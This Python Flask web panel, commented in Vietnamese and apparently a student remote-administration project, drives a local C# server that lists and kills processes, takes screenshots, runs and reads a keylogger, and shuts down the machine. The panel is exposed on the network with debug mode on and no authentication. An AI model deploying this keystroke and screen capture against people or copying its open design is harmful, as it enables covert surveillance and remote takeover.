from flask import Flask, render_template, request, jsonify
import socket
import base64

app = Flask(__name__)

# Cấu hình kết nối tới C# Server
HOST = '127.0.0.1'
PORT = 5656

# Danh sách ánh xạ tên thông dụng sang tên tiến trình thực tế
APP_ALIASES = {
    "edge": "msedge",
    "chrome": "chrome",
    "coc coc": "browser",
    "word": "winword",
    "excel": "excel",
    "powerpoint": "powerpnt",
    "notepad": "notepad",
    "calc": "calc",
    "paint": "mspaint",
    "cmd": "cmd"
}

# Hàm tiện ích nhận đủ n bytes dữ liệu (dùng cho ảnh)
def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet: return None
        data += packet
    return data

# Hàm trung tâm: Gửi lệnh Socket sang C# Server và xử lý phản hồi
def send_command_to_server(command_type, sub_command=None, args=None):
    response_data = None
    status = "error"
    msg = ""
    client = None

    try:
        # 1. Tạo kết nối Socket
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(10) # Timeout 10s tránh treo web
        client.connect((HOST, PORT))
        writer = client.makefile('w', encoding='utf-8', newline='\r\n')
        
        # 2. Gửi lệnh chính (PROCESS, KEYLOG, TAKEPIC...)
        writer.write(f"{command_type}\n")
        writer.flush()

        # 3. Xử lý từng loại lệnh cụ thể
        if command_type in ["PROCESS", "APPLICATION"]:
            reader = client.makefile('r', encoding='utf-8', newline='\r\n')
            
            if sub_command == "XEM": # Lấy danh sách
                writer.write("XEM\n")
                writer.flush()
                try:
                    line = reader.readline() # Đọc số lượng
                    if line:
                        count = int(line.strip())
                        data_list = []
                        for _ in range(count):
                            p_name = reader.readline().strip()
                            p_id = reader.readline().strip()
                            p_threads = reader.readline().strip()
                            data_list.append({"name": p_name, "id": p_id, "threads": p_threads})
                        response_data = data_list
                        status = "success"
                except Exception as e:
                    msg = f"Read error: {str(e)}"

            elif sub_command in ["KILL", "START"]: # Diệt hoặc Mở
                writer.write(f"{sub_command}\n")
                writer.write(f"{sub_command}ID\n")
                
                # Xử lý alias (ví dụ nhập 'word' -> gửi 'winword')
                final_args = args
                if sub_command == "START" and args:
                    lower_arg = args.lower()
                    if lower_arg in APP_ALIASES:
                        final_args = APP_ALIASES[lower_arg]
                
                writer.write(f"{final_args}\n") 
                writer.flush()
                
                # Đọc kết quả trả về từ C#
                result = reader.readline()
                if result:
                    result = result.strip()
                    if "Successfully" in result:
                        status = "success"
                    msg = result
                else:
                    msg = "No response from server"
            
            writer.write("QUIT\n")
            writer.flush()

        elif command_type == "TAKEPIC":
            client.sendall(b"TAKE\n")
            # Đọc kích thước ảnh trước
            size_buffer = b""
            while True:
                char = client.recv(1)
                if char == b'\n' or not char: break
                size_buffer += char
            
            size_str = size_buffer.decode('utf-8').strip()
            if size_str.isdigit() and int(size_str) > 0:
                # Đọc dữ liệu ảnh theo kích thước
                img_data = recvall(client, int(size_str))
                if img_data:
                    # Chuyển ảnh sang Base64 để hiển thị trên Web
                    response_data = base64.b64encode(img_data).decode('utf-8')
                    status = "success"
            client.sendall(b"QUIT\n")

        elif command_type == "KEYLOG":
            reader = client.makefile('r', encoding='utf-8', newline='\r\n')
            if sub_command == "PRINT":
                writer.write("PRINT\n")
                writer.flush()
                response_data = reader.readline().strip()
                status = "success"
            elif sub_command in ["HOOK", "UNHOOK"]:
                writer.write(f"{sub_command}\n")
                writer.flush()
                status = "success"
                msg = "Keylogger Hooked (On)" if sub_command == "HOOK" else "Keylogger Unhooked (Off)"
            elif sub_command == "CLEAR":
                writer.write("CLEAR\n")
                writer.flush()
                status = "success"
                msg = reader.readline().strip()
            elif sub_command == "STATUS":
                writer.write("STATUS\n")
                writer.flush()
                status_str = reader.readline().strip()
                response_data = status_str
                status = "success"

            writer.write("QUIT\n")
            writer.flush()

        elif command_type in ["SHUTDOWN", "RESTART"]:
            status = "success"
            msg = f"Sent {command_type} command."
            writer.write("QUIT\n")
            writer.flush()

    except Exception as e:
        msg = f"Server Error: {str(e)}"
    finally:
        if client: client.close()

    return {"status": status, "data": response_data, "message": msg}

# --- CÁC API ROUTES (Endpoints cho Frontend gọi) ---

@app.route('/')
def index(): return render_template('index.html')

@app.route('/api/keylog/status')
def get_keylog_status(): 
    return jsonify(send_command_to_server("KEYLOG", "STATUS"))

@app.route('/api/process/list')
def get_processes(): return jsonify(send_command_to_server("PROCESS", "XEM"))

@app.route('/api/process/kill', methods=['POST'])
def kill_process(): return jsonify(send_command_to_server("PROCESS", "KILL", request.json.get('id')))

@app.route('/api/process/start', methods=['POST'])
def start_process(): return jsonify(send_command_to_server("PROCESS", "START", request.json.get('name')))

@app.route('/api/app/list')
def get_apps(): return jsonify(send_command_to_server("APPLICATION", "XEM"))

@app.route('/api/app/kill', methods=['POST'])
def kill_app(): return jsonify(send_command_to_server("APPLICATION", "KILL", request.json.get('id')))

@app.route('/api/screenshot')
def take_screenshot(): return jsonify(send_command_to_server("TAKEPIC"))

@app.route('/api/keylog/get')
def get_keylog(): return jsonify(send_command_to_server("KEYLOG", "PRINT"))

@app.route('/api/keylog/hook', methods=['POST'])
def hook_keylog(): return jsonify(send_command_to_server("KEYLOG", request.json.get('action')))

@app.route('/api/keylog/clear', methods=['POST'])
def clear_keylog(): return jsonify(send_command_to_server("KEYLOG", "CLEAR"))

@app.route('/api/power', methods=['POST'])
def power_action(): return jsonify(send_command_to_server(request.json.get('action')))

if __name__ == '__main__':
    # host='0.0.0.0' cho phép truy cập từ các máy khác trong mạng LAN
    app.run(host='0.0.0.0', debug=True, port=5000)